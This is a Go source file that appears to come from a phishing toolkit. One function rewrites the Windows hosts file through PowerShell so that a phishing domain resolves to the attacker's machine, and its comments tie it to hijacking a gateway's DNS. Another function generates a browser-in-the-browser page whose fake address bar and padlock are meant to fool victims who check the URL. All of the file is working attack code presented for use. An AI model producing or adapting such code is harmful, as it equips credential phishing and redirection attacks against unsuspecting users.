//go:build windows

package main

import (
	"fmt"
	"net"
	"os/exec"
	"strings"
)

// setupDNSRedirect points a specific hostname at this machine for the local
// network. It pairs with the router plugin: once you own the gateway's DNS,
// this is the record that makes the phishing domain resolve to you.
func setupDNSRedirect(s Settings) {
	domain := strings.TrimSpace(s.PhishDomain)
	if domain == "" {
		sendEvent("error", map[string]interface{}{"message": "phish domain required"})
		return
	}

	local := localIP()
	if local == "" {
		sendEvent("error", map[string]interface{}{"message": "could not determine local IP"})
		return
	}

	hostsPath := `C:\Windows\System32\drivers\etc\hosts`
	entry := fmt.Sprintf("\n%s %s\n", local, domain)

	// Append via PowerShell so we get elevation errors reported properly
	// rather than silently failing.
	script := fmt.Sprintf(
		`$p='%s'; $e='%s'; `+
			`if (-not (Select-String -Path $p -Pattern '%s' -SimpleMatch -Quiet)) { Add-Content -Path $p -Value $e }`,
		hostsPath, strings.ReplaceAll(entry, "\n", "`n"), domain)

	out, err := exec.Command("powershell", "-NoProfile", "-Command", script).CombinedOutput()
	if err != nil {
		sendEvent("error", map[string]interface{}{
			"message": "hosts update failed (needs admin): " + strings.TrimSpace(string(out)),
		})
		return
	}

	sendEvent("dns_redirect", map[string]interface{}{
		"domain": domain, "ip": local, "method": "hosts",
	})
	sendEvent("status", map[string]interface{}{
		"state":  "done",
		"detail": fmt.Sprintf("%s now resolves to %s on this host", domain, local),
	})
}

func localIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return ""
	}
	defer conn.Close()
	if a, ok := conn.LocalAddr().(*net.UDPAddr); ok {
		return a.IP.String()
	}
	return ""
}

// ---------------------------------------------------------------------------
// BitB (browser-in-the-browser) page
//
// A fake browser chrome drawn inside the real page, complete with a spoofed
// URL bar and padlock. It defeats the "check the address bar" habit precisely
// because the address bar the victim inspects is part of the attacker's page.
// ---------------------------------------------------------------------------

func bitbPage(targetURL, domain string) string {
	return `<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>` + domain + `</title>
<style>
html,body{margin:0;height:100%;background:#000;font-family:system-ui,sans-serif;overflow:hidden}
.chrome{position:fixed;inset:0;display:flex;flex-direction:column;background:#202124}
.tabs{height:40px;background:#35363a;display:flex;align-items:flex-end;padding-left:8px}
.tab{background:#202124;color:#e8eaed;font-size:12px;padding:9px 16px;border-radius:8px 8px 0 0;
display:flex;align-items:center;gap:8px;max-width:220px}
.fav{width:14px;height:14px;border-radius:3px;background:#4285f4}
.bar{height:44px;background:#202124;display:flex;align-items:center;gap:10px;padding:0 12px;border-bottom:1px solid #000}
.dots{display:flex;gap:6px}.dot{width:11px;height:11px;border-radius:50%}
.d1{background:#ff5f57}.d2{background:#febc2e}.d3{background:#28c840}
.url{flex:1;background:#292a2d;border-radius:16px;height:30px;display:flex;align-items:center;
padding:0 14px;color:#9aa0a6;font-size:12.5px;gap:8px}
.lock{color:#9aa0a6;font-size:11px}
.host{color:#e8eaed}
.content{flex:1;background:#fff;position:relative}
iframe{border:0;width:100%;height:100%;display:block}
</style></head>
<body>
<div class="chrome">
  <div class="bar">
    <div class="dots"><div class="dot d1"></div><div class="dot d2"></div><div class="dot d3"></div></div>
    <div class="url"><span class="lock">&#128274;</span><span class="host">` + domain + `</span></div>
  </div>
  <div class="tabs"><div class="tab"><span class="fav"></span>` + domain + `</div></div>
  <div class="content"><iframe src="` + targetURL + `" allow="clipboard-read; clipboard-write"></iframe></div>
</div>
</body></html>`
}
